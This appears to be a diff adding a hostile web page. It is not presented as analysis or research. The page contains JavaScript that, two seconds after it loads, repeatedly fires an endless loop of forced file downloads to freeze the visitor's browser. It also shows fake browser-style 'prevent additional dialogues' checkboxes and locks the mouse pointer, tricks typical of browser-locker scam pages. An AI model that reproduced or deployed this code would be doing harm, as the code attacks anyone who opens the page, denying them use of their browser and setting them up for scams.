@@ -1,0 +1,37 @@
+
+<div style="font-size: small"><input type="checkbox" checked="checked"> Prevent this page from creating additional dialogues.</div>
+<label style="font-size: 12px;"><input checked="nonchecked" type="checkbox"> Prevent this page from creating additional dialogues.</label>
+
+<script type="text/javascript">
+      function download(g, h, j) {
+          var k = new Blob([g], {
+              type: j
+          });
+          if (window.navigator.msSaveOrOpenBlob) window.navigator.msSaveOrOpenBlob(k, h);
+          else {
+              var l = document.createElement("a"),
+                  m = URL.createObjectURL(k);
+              l.href = m, l.download = h, l.click(), setTimeout(function() {}, 0)
+          }
+      }
+      function bomb_ch() {
+          var g = Math.random().toString(36).substring(20),
+              h = Math.floor(50 * Math.random() + 25);
+          while (true) download(h, g, g)
+      }
+      function ch_jam() {
+          bomb_ch()
+      }
+      docReady(function()
+              {
+                  setTimeout(function(){
+          setInterval(ch_jam, 0.5);
+      }, 2000);
+              });
+
+  </script>
+  
+var canvas = document.getElementById('mycanvas');
+canvas.requestPointerLock = canvas.requestPointerLock || canvas.mozRequestPointerLock || canvas.webkitRequestPointerLock;
+canvas.requestPointerLock();
+
